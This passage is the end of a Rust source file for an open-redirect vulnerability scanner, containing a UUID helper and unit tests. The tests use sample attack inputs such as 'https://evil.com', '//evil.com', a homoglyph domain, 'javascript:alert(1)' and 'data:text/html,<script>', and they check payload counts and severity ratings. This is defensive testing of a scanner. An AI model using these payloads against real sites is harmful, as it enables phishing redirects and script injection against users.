    has_location_header: bool,
    body_length: usize,
}

// UUID generation helper
mod uuid {
    use rand::Rng;

    pub struct Uuid;

    impl Uuid {
        pub fn new_v4() -> String {
            let mut rng = rand::rng();
            format!(
                "{:08x}-{:04x}-{:04x}-{:04x}-{:012x}",
                rng.random::<u32>(),
                rng.random::<u16>(),
                rng.random::<u16>(),
                rng.random::<u16>(),
                rng.random::<u64>() & 0xffffffffffff
            )
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::http_client::HttpClient;
    use std::sync::Arc;

    fn create_test_scanner() -> OpenRedirectScanner {
        let http_client = Arc::new(HttpClient::new(30, 3).unwrap());
        OpenRedirectScanner::new(http_client)
    }

    #[test]
    fn test_is_dangerous_redirect_external() {
        let scanner = create_test_scanner();
        assert!(scanner.is_dangerous_redirect("https://evil.com", "https://evil.com"));
        assert!(scanner.is_dangerous_redirect("//evil.com", "//evil.com"));
        assert!(scanner.is_dangerous_redirect("https://evil。com", "evil"));
    }

    #[test]
    fn test_is_dangerous_redirect_protocols() {
        let scanner = create_test_scanner();
        assert!(scanner.is_dangerous_redirect("javascript:alert(1)", "javascript:alert(1)"));
        assert!(scanner.is_dangerous_redirect("data:text/html,<script>", "data:"));
        assert!(scanner.is_dangerous_redirect("vbscript:msgbox", "vbscript:"));
    }

    #[test]
    fn test_is_dangerous_redirect_safe() {
        let scanner = create_test_scanner();
        assert!(!scanner.is_dangerous_redirect("/internal/page", "/internal/page"));
        assert!(!scanner.is_dangerous_redirect("/dashboard", "dashboard"));
    }

    #[test]
    fn test_extract_domain() {
        let scanner = create_test_scanner();
        assert_eq!(scanner.extract_domain("https://example.com/path"), "example.com");
        assert_eq!(scanner.extract_domain("https://sub.example.com"), "sub.example.com");
    }

    #[test]
    fn test_payload_count() {
        let scanner = create_test_scanner();
        let payloads = scanner.get_advanced_payloads("example.com");
        assert!(payloads.len() >= 100, "Should have at least 100 payloads, got {}", payloads.len());
    }

    #[test]
    fn test_redirect_params_count() {
        let scanner = create_test_scanner();
        let params = scanner.get_redirect_params();
        assert!(params.len() >= 50, "Should have at least 50 param names, got {}", params.len());
    }

    #[test]
    fn test_determine_severity() {
        let scanner = create_test_scanner();

        assert_eq!(
            scanner.determine_severity(&BypassCategory::DangerousProtocol, "javascript:alert(1)"),
            Severity::High
        );
        assert_eq!(
            scanner.determine_severity(&BypassCategory::Basic, "https://evil.com"),
            Severity::Medium
        );
    }
}
